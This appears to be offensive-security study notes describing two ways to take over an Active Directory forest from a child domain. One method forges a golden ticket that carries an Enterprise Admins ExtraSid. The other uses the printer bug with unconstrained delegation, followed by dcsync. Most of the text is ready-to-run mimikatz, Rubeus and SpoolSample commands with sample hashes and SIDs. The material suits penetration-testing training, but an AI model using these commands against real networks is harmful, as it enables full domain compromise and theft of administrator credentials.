### Owning the Forest with Extra SIDs
The user's logon and authorization information is stored within a structure called [_KERB_VALIDATION_INFO_](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73?redirectedfrom=MSDN) inside the TGT.
When we craft a golden ticket, we create a TGT with our desired group membership.
The _ExtraSids_ field within the KERB_VALIDATION_INFO structure includes SIDs that originate in a foreign domain and show membership in a trusted domain.

ExtraSids can be used during Active Directory domain migrations to grant access from one domain to another.

The technical implementation of Kerberos authentication across domains depends on the _trust key_. Since Domain B cannot know the password hash of Domain A, it has no way of decrypting a TGT sent from Domain A to Domain B.
A shared secret, created when the trust is configured, solves this.

When the domain trust is established, a new computer account with the name of the trusted domain is also created. In prod.corp1.com, the computer account is called: 
_corp1$_,
which is also referred to as the trust account.
The shared secret is the password hash of _corp1$_.

For a bi-directional trust like that of parent and child domains, both prod.corp1.com and corp1.com create the trust account.
The name of the account is always the same as the trusted domain, so inside corp1.com it is called:
prod$
but both, 
prod$ and,
corp$
have the same password hash

We can obtain the NTLM hash of the trust account from the domain controller with mimikatz with:
```mimikatz
lsadump::dcsync /domain:prod.corp1.com /user:corp1$
```

If a user in prod.corp1.com wants to access a service in corp1.com, the domain controller in prod.corp1.com will create a TGT for corp1.com and indicate that it's a referral to a TGS. This TGT is not signed by the _krbtgt_ password hash but instead with the trust key.

However, If we compromise the _krbtgt_ account password of our current domain, we can craft a golden ticket that contains an ExtraSid with group membership of Enterprise Admins.

We can craft the golden ticket with the following command:
```Powershell
kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
```

### Owning the Forest with Printers
We can reuse the printer bug to directly target a domain controller in the forest root domain and instantly compromise the entire forest from a single server.

This technique does not require Domain Admin privileges.
However, if we have Domain Admin privileges and no servers with unconstrained delegation exist in our current domain, we can create one ourselves by modifying the configuration of one of the servers.

 We will be opening an administrative command prompt and then use Rubeus to monitor for new tickets from the root domain controller machine account:
 ```Powershell
 Rubeus.exe monitor /interval:5 /filteruser:RDC01$
 ```

we'll switch back to our PowerShell prompt and launch SpoolSample to force the print change notification from rdc01:
```Powershell
.\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
```

With the ticket obtained, we can use Rubeus to inject it into memory:
```Powershell
Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
```

The root domain controller computer account is not a local administrator on rdc01, so we cannot directly obtain code execution. However, a domain controller computer account has the access right to perform AD replication.
Thus, we can perform a dcsync attack:
```mimikatz
lsadump::dcsync /domain:corp1.com /user:corp1\administrator
```

